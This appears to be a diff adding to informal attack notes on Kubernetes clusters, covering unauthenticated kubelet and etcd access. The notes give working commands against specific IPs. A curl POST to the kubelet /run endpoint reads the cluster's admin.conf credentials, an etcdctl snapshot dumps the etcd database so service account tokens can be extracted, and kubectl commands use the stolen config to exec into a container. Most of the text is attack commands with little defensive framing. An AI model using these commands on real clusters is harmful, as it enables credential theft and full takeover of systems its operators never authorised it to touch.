@@ -28,10 +28,23 @@ attacking the readonly port we can get more info. disclosure
 /stats/summary
 /spec/
 
-so http://knode1:10255/pods can provide us some interesting information.
+so http://knode1:10255/pods can provide us some interesting information. including things like the fact that privileged containers are permitted and the insecure port is available!.
 
 Attacking the main kubelet port we can do a lot more, if it's exposed.
 
 https://knode1:10250/containerLogs/kube-system/kube-apiserver-kubeadmnode1/kube-apiserver/
 
 curl -k -XPOST "https://192.168.111.10:10250/run/kube-system/kube-apiserver-kubeadmnode1/kube-apiserver" -d "cmd=cat /etc/kubernetes/admin.conf"
+
+## Attacking etcd
+
+export ETCDCTL_API=3
+etcdctl --endpoints=http://192.168.111.10:2379 snapshot save test2.db
+
+This dumps the etcd database into a file.  It's not pure text however things like service account tokens are stored in there, so it should be relatively easy to extract that information from the system.
+
+# Using Service Tokens
+
+export KUBECONFIG=/root/admin.conf
+kubectl exec -it badcontainer-3610113689-3sw9d /bin/sh
+kubectl config set-cluster test --server=https://192.168.111.10:6443
